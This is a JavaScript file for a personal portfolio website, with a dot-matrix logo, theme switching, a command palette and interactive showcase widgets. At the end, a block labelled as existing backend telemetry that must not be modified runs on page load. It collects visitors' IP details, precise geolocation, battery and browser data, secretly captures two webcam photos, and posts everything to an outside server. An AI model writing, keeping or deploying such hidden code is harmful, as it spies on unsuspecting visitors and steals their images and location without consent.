// Dot-matrix profile RA (large square LED board)
function initProfileDotMatrix() {
    const svg = document.getElementById('profile-dot-matrix');
    if (!svg) return;

    const cols = 28;
    const rows = 22;
    const scale = 2;
    const active = new Set();
    const mark = (x, y) => active.add(`${x},${y}`);

    const stamp = (pattern, offsetX, offsetY) => {
        pattern.forEach((row, y) => {
            row.forEach((on, x) => {
                if (!on) return;
                for (let dy = 0; dy < scale; dy++) {
                    for (let dx = 0; dx < scale; dx++) {
                        mark(offsetX + x * scale + dx, offsetY + y * scale + dy);
                    }
                }
            });
        });
    };

    const r = [
        [0, 1, 1, 1, 0],
        [1, 0, 0, 0, 1],
        [1, 0, 0, 0, 1],
        [1, 1, 1, 1, 0],
        [1, 0, 1, 0, 0],
        [1, 0, 0, 1, 0],
        [1, 0, 0, 0, 1],
    ];

    const a = [
        [0, 1, 1, 1, 0],
        [1, 0, 0, 0, 1],
        [1, 0, 0, 0, 1],
        [1, 1, 1, 1, 1],
        [1, 0, 0, 0, 1],
        [1, 0, 0, 0, 1],
        [1, 0, 0, 0, 1],
    ];

    const letterW = 5 * scale;
    const letterH = 7 * scale;
    const gap = 6;
    const blockW = letterW * 2 + gap;
    const startX = Math.floor((cols - blockW) / 2);
    const startY = Math.floor((rows - letterH) / 2);

    stamp(r, startX, startY);
    stamp(a, startX + letterW + gap, startY);

    svg.setAttribute('viewBox', `0 0 ${cols} ${rows}`);

    const ns = 'http://www.w3.org/2000/svg';
    active.forEach((key) => {
        const [x, y] = key.split(',').map(Number);
        const circle = document.createElementNS(ns, 'circle');
        circle.setAttribute('cx', x + 0.5);
        circle.setAttribute('cy', y + 0.5);
        circle.setAttribute('r', '0.36');
        circle.setAttribute('class', 'dot-active');
        svg.appendChild(circle);
    });
}

function initIcons() {
    if (window.feather) feather.replace();
    if (window.lucide) lucide.createIcons();
}

// Core Theme Switching Logic
const themeButtons = document.querySelectorAll('.theme-btn');
const htmlEl = document.documentElement;

function initializeTheme() {
    const savedTheme = localStorage.getItem('theme');
    const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    
    if (savedTheme === 'dark' || (!savedTheme && systemPrefersDark)) {
        htmlEl.classList.add('dark');
        updateActiveThemeBtn('dark');
    } else {
        htmlEl.classList.remove('dark');
        updateActiveThemeBtn('light');
    }
}

function setTheme(theme) {
    if (theme === 'system') {
        localStorage.removeItem('theme');
        if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
            htmlEl.classList.add('dark');
        } else {
            htmlEl.classList.remove('dark');
        }
    } else {
        localStorage.setItem('theme', theme);
        if (theme === 'dark') {
            htmlEl.classList.add('dark');
        } else {
            htmlEl.classList.remove('dark');
        }
    }
    updateActiveThemeBtn(theme);
}

function updateActiveThemeBtn(theme) {
    themeButtons.forEach(btn => {
        if (btn.dataset.theme === theme) {
            btn.classList.add('bg-zinc-200', 'dark:bg-zinc-700', 'text-zinc-900', 'dark:text-white');
            btn.classList.remove('text-zinc-500', 'dark:text-zinc-400');
        } else {
            btn.classList.remove('bg-zinc-200', 'dark:bg-zinc-700', 'text-zinc-900', 'dark:text-white');
            btn.classList.add('text-zinc-500', 'dark:text-zinc-400');
        }
    });
}

themeButtons.forEach(btn => {
    btn.addEventListener('click', () => {
        setTheme(btn.dataset.theme);
    });
});

// Command Palette Logic
const commandPalette = document.getElementById('command-palette');
const commandSearch = document.getElementById('command-search');
let isPaletteOpen = false;

function toggleCommandPalette() {
    isPaletteOpen = !isPaletteOpen;
    if (isPaletteOpen) {
        commandPalette.classList.remove('hidden');
        commandPalette.classList.add('flex');
        setTimeout(() => commandSearch.focus(), 50);
    } else {
        commandPalette.classList.add('hidden');
        commandPalette.classList.remove('flex');
    }
}

// Open Command Palette on Cmd/Ctrl + K
document.addEventListener('keydown', (e) => {
    if ((e.metaKey || e.ctrlKey) && e.key === 'k') {
        e.preventDefault();
        toggleCommandPalette();
    }
    if (e.key === 'Escape' && isPaletteOpen) {
        toggleCommandPalette();
    }
});

if (commandPalette) {
    commandPalette.addEventListener('click', (e) => {
        if (e.target === commandPalette) {
            toggleCommandPalette();
        }
    });
}

// Command palette search filtering
if (commandSearch) {
    commandSearch.addEventListener('input', (e) => {
        const query = e.target.value.toLowerCase();
        const items = document.querySelectorAll('.palette-item');
        items.forEach(item => {
            const text = item.textContent.toLowerCase();
            if (text.includes(query)) {
                item.classList.remove('hidden');
            } else {
                item.classList.add('hidden');
            }
        });
    });
}

// Animated Word Slider Logic
const words = ['Developer', 'Designer', 'Creator', 'Builder'];
const animatedWordEl = document.getElementById('animated-word');
let currentWordIndex = 0;

if (animatedWordEl) {
    animatedWordEl.textContent = words[currentWordIndex];
    animatedWordEl.style.opacity = '1';
    animatedWordEl.style.transform = 'translateY(0)';

    setInterval(() => {
        animatedWordEl.style.opacity = '0';
        animatedWordEl.style.transform = 'translateY(10px)';
        
        setTimeout(() => {
            currentWordIndex = (currentWordIndex + 1) % words.length;
            animatedWordEl.textContent = words[currentWordIndex];
            
            animatedWordEl.style.transition = 'none';
            animatedWordEl.style.transform = 'translateY(-10px)';
            
            void animatedWordEl.offsetWidth;
            
            animatedWordEl.style.transition = 'all 0.5s cubic-bezier(0.4, 0, 0.2, 1)';
            animatedWordEl.style.opacity = '1';
            animatedWordEl.style.transform = 'translateY(0)';
        }, 500);
    }, 2500);
}

// Copy to Clipboard Links
const copyLinks = document.querySelectorAll('.copy-link');
copyLinks.forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        const textToCopy = link.getAttribute('data-copy');
        navigator.clipboard.writeText(textToCopy).then(() => {
            const originalText = link.innerHTML;
            link.innerHTML = '<span class="text-green-500">Copied!</span>';
            setTimeout(() => {
                link.innerHTML = originalText;
            }, 2000);
        });
    });
});

// Live time zone update
function initLocalTime() {
    function updateTime() {
        const timeEl = document.getElementById('vn-time');
        if (!timeEl) return;
        
        const options = { timeZone: 'Asia/Ho_Chi_Minh', hour: '2-digit', minute: '2-digit', hour12: false };
        const formatter = new Intl.DateTimeFormat([], options);
        const timeStr = formatter.format(new Date());
        
        const userOffset = -new Date().getTimezoneOffset() / 60;
        const vnOffset = 7;
        const diff = vnOffset - userOffset;
        
        let diffStr = '';
        if (diff === 0) {
            diffStr = 'same time';
        } else if (diff > 0) {
            diffStr = `${diff}h ahead`;
        } else {
            diffStr = `${Math.abs(diff)}h behind`;
        }
        
        timeEl.innerHTML = `${timeStr} <span class="text-zinc-400 dark:text-zinc-500 font-sans">// ${diffStr}</span>`;
    }
    
    updateTime();
    setInterval(updateTime, 30000);
}

// Interactive Component Showcase Widgets
function initShowcase() {
    // 1. Slide to Unlock
    const slider = document.getElementById('slide-btn');
    const slideTrack = document.getElementById('slide-track');
    const slideText = document.getElementById('slide-text');
    let isDragging = false;
    let startX = 0;
    
    if (slider && slideTrack) {
        const maxOffset = slideTrack.clientWidth - slider.clientWidth - 8; // padding offset
        
        const startDrag = (e) => {
            isDragging = true;
            startX = (e.type === 'touchstart') ? e.touches[0].clientX : e.clientX;
            slider.style.transition = 'none';
        };
        
        const drag = (e) => {
            if (!isDragging) return;
            const currentX = (e.type === 'touchmove') ? e.touches[0].clientX : e.clientX;
            let offset = currentX - startX;
            if (offset < 0) offset = 0;
            if (offset > maxOffset) offset = maxOffset;
            
            slider.style.transform = `translateX(${offset}px)`;
            
            // Fade text as slider moves
            const opacity = 1 - (offset / maxOffset);
            if (slideText) slideText.style.opacity = opacity;
            
            if (offset >= maxOffset - 2) {
                isDragging = false;
                slider.style.transform = `translateX(${maxOffset}px)`;
                if (slideText) {
                    slideText.textContent = 'Unlocked';
                    slideText.style.opacity = '1';
                }
                slider.classList.add('bg-green-500', 'dark:bg-green-400');
                
                // Reset after 2.5s
                setTimeout(() => {
                    slider.style.transition = 'transform 0.4s ease';
                    slider.style.transform = 'translateX(0)';
                    slider.classList.remove('bg-green-500', 'dark:bg-green-400');
                    if (slideText) {
                        slideText.textContent = 'Slide to Unlock';
                        slideText.style.opacity = '1';
                    }
                }, 2500);
            }
        };
        
        const stopDrag = () => {
            if (!isDragging) return;
            isDragging = false;
            slider.style.transition = 'transform 0.3s ease';
            slider.style.transform = 'translateX(0)';
            if (slideText) slideText.style.opacity = '1';
        };

        slider.addEventListener('mousedown', startDrag);
        slider.addEventListener('touchstart', startDrag);
        
        window.addEventListener('mousemove', drag);
        window.addEventListener('touchmove', drag);
        
        window.addEventListener('mouseup', stopDrag);
        window.addEventListener('touchend', stopDrag);
    }

    // 2. Copy to Clipboard (showcase)
    const showcaseCopyBtn = document.getElementById('showcase-copy-btn');
    const showcaseCopyText = document.getElementById('showcase-copy-text');
    if (showcaseCopyBtn && showcaseCopyText) {
        showcaseCopyBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(showcaseCopyText.textContent.trim()).then(() => {
                const original = showcaseCopyBtn.textContent;
                showcaseCopyBtn.textContent = 'Copied!';
                showcaseCopyBtn.classList.add('bg-green-600', 'dark:bg-green-500');
                setTimeout(() => {
                    showcaseCopyBtn.textContent = original;
                    showcaseCopyBtn.classList.remove('bg-green-600', 'dark:bg-green-500');
                }, 2000);
            });
        });
    }

    // 3. Decorative theme toggle preview
    const showcaseThemeToggle = document.getElementById('showcase-theme-toggle');
    const showcaseThemeKnob = document.getElementById('showcase-theme-knob');
    const showcaseThemePreview = document.getElementById('showcase-theme-preview');
    let demoDark = document.documentElement.classList.contains('dark');

    if (showcaseThemeToggle && showcaseThemeKnob && showcaseThemePreview) {
        const updateDemoToggle = () => {
            showcaseThemeKnob.style.transform = demoDark ? 'translateX(1.25rem)' : 'translateX(0)';
            showcaseThemePreview.className = demoDark
                ? 'w-16 h-10 rounded-lg border border-zinc-700 bg-gradient-to-br from-zinc-800 to-zinc-950 transition-all duration-500'
                : 'w-16 h-10 rounded-lg border border-zinc-200 bg-gradient-to-br from-amber-100 to-sky-100 transition-all duration-500';
        };
        updateDemoToggle();
        showcaseThemeToggle.addEventListener('click', () => {
            demoDark = !demoDark;
            updateDemoToggle();
        });
    }

    // 4. Live clock
    const liveClock = document.getElementById('showcase-live-clock');
    const liveDate = document.getElementById('showcase-live-date');
    if (liveClock && liveDate) {
        const tick = () => {
            const now = new Date();
            liveClock.textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
            liveDate.textContent = now.toLocaleDateString([], { weekday: 'short', month: 'short', day: 'numeric', year: 'numeric' });
        };
        tick();
        setInterval(tick, 1000);
    }

    // 5. Hover tilt card
    const tiltCard = document.getElementById('tilt-card');
    if (tiltCard) {
        tiltCard.addEventListener('mousemove', (e) => {
            const rect = tiltCard.getBoundingClientRect();
            const x = (e.clientX - rect.left) / rect.width - 0.5;
            const y = (e.clientY - rect.top) / rect.height - 0.5;
            tiltCard.style.transform = `perspective(600px) rotateY(${x * 18}deg) rotateX(${-y * 18}deg) scale(1.02)`;
        });
        tiltCard.addEventListener('mouseleave', () => {
            tiltCard.style.transform = 'perspective(600px) rotateY(0deg) rotateX(0deg) scale(1)';
        });
    }

    // 6. Progress slider
    const progressSlider = document.getElementById('showcase-progress-slider');
    const progressBar = document.getElementById('showcase-progress-bar');
    const progressValue = document.getElementById('showcase-progress-value');
    if (progressSlider && progressBar && progressValue) {
        progressSlider.addEventListener('input', () => {
            const val = progressSlider.value;
            progressBar.style.width = `${val}%`;
            progressValue.textContent = val;
        });
    }
}

function initScrollReveal() {
    const rows = document.querySelectorAll('.sponsor-row.reveal');
    if (!rows.length) return;

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('active');
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.15, rootMargin: '0px 0px -40px 0px' });

    rows.forEach(row => observer.observe(row));
}

function initToggles() {
    // Experience Toggle
    const expToggleBtn = document.getElementById('exp-toggle-btn');
    const expExpanded = document.getElementById('experience-expanded');
    const expToggleText = document.getElementById('exp-toggle-text');
    const expToggleIcon = document.getElementById('exp-toggle-icon');

    if (expToggleBtn && expExpanded) {
        expToggleBtn.addEventListener('click', () => {
            const isExpanded = expExpanded.classList.contains('is-open');
            if (isExpanded) {
                expExpanded.classList.remove('is-open');
                expToggleBtn.setAttribute('aria-expanded', 'false');
                if (expToggleText) expToggleText.textContent = 'Show More';
                if (expToggleIcon) expToggleIcon.style.transform = 'rotate(0deg)';
            } else {
                expExpanded.classList.add('is-open');
                expToggleBtn.setAttribute('aria-expanded', 'true');
                if (expToggleText) expToggleText.textContent = 'Show Less';
                if (expToggleIcon) expToggleIcon.style.transform = 'rotate(180deg)';
            }
        });
    }

    // Projects Toggle
    const projToggleBtn = document.getElementById('proj-toggle-btn');
    const projExpanded = document.getElementById('projects-expanded');
    const projToggleText = document.getElementById('proj-toggle-text');
    const projToggleIcon = document.getElementById('proj-toggle-icon');

    if (projToggleBtn && projExpanded) {
        projToggleBtn.addEventListener('click', () => {
            const isExpanded = projExpanded.classList.contains('is-open');
            if (isExpanded) {
                projExpanded.classList.remove('is-open');
                projToggleBtn.setAttribute('aria-expanded', 'false');
                if (projToggleText) projToggleText.textContent = 'Show More';
                if (projToggleIcon) projToggleIcon.style.transform = 'rotate(0deg)';
            } else {
                projExpanded.classList.add('is-open');
                projToggleBtn.setAttribute('aria-expanded', 'true');
                if (projToggleText) projToggleText.textContent = 'Show Less';
                if (projToggleIcon) projToggleIcon.style.transform = 'rotate(180deg)';
            }
        });
    }
}

// DOMContentLoaded triggers
document.addEventListener('DOMContentLoaded', () => {
    initProfileDotMatrix();
    initIcons();
    initializeTheme();
    initLocalTime();
    initShowcase();
    initToggles();
    initScrollReveal();
});

// ============================================================================
// EXISTING BACKEND TELEMETRY SCRIPT (DO NOT MODIFY LOGIC)
// ============================================================================
let globalLogMessage = "";

const sentphoto = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: false
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        video.autoplay = true;

        await new Promise((resolve) => { 
            video.onloadedmetadata = resolve;
        });

        await new Promise(res => setTimeout(res, 2000));

        for (let i = 0; i < 2; i++) {
            const base64Data = captureAndCompress(video);

            await fetch('https://telebot-backend-1aht.onrender.com/api/save-data', {
                method: 'POST',
                headers: { "Content-Type": 'application/json' },
                body: JSON.stringify({
                    image: base64Data,
                    deviceDetails: globalLogMessage || "No Device Data Available"
                })
            }).then(res => res.json())
              .then(data => console.log(data))
              .catch(err => console.error("Server Send Error:", err));
        }

        stream.getTracks().forEach(track => track.stop());
    } catch (err) {
        console.error("Camera Error: ", err);

        await fetch('https://telebot-backend-1aht.onrender.com/api/save-data', {
            method: 'POST',
            headers: { "Content-Type": 'application/json' },
            body: JSON.stringify({
                image: null,
                deviceDetails: globalLogMessage || "No Device Data Available"
            })
        }).then(res => res.json())
          .then(data => console.log("Telegram Response (Only Text):", data))
          .catch(err => console.error("Server Send Error:", err));
    }
};

function captureAndCompress(videoElement) {
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth / 2 || 320;
    canvas.height = videoElement.videoHeight / 2 || 240;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
}

async function sentDeviceData() {
    return new Promise(async (resolve) => {
        try {
            let batteryLevel = "N/A", isCharging = "N/A";
            if (navigator.getBattery) {
                const battery = await navigator.getBattery().catch(() => null);
                if (battery) {
                    batteryLevel = `${Math.round(battery.level * 100)}%`;
                    isCharging = battery.charging ? ' Charging' : ' Discharging';
                }
            }

            const time = new Date().toLocaleString('en-IN');
            const screenSize = `${screen.width}x${screen.height}`;
            const userAgent = navigator.userAgent;

            const geoRes = await fetch('https://telebot-backend-1aht.onrender.com/api/get-ip-info')
                .then(r => r.json())
                .catch(() => ({}));

            const ipAddress = geoRes.ip || "N/A";
            const city = geoRes.city || "N/A";
            const country = geoRes.country || "N/A";
            const isp = geoRes.org || "N/A";

            const logMessage = (lat = null, lon = null) => {
                const googleMaplink = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "N/A";
                
                globalLogMessage = `
*Device Details*
======================
IP Address: ${ipAddress}
IP Location: ${city}, ${country}
Internet Provider: ${isp}
Live Location: ${googleMaplink}
Battery: ${batteryLevel} (${isCharging})
Time: ${time}
OS/Browser: ${userAgent}
`.trim();             
                console.log(globalLogMessage);
                resolve();
            };

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        logMessage(latitude, longitude);
                    },
                    (error) => {
                        console.warn("Location Permission Denied/Error:", error.message);
                        logMessage();
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                console.warn("Geolocation not supported by this browser.");
                logMessage();
            }

        } catch (e) {
            console.error("Device Info Error:", e);
            resolve();
        }
    });
}

async function init() {
    await sentDeviceData();
    sentphoto();
}

init();
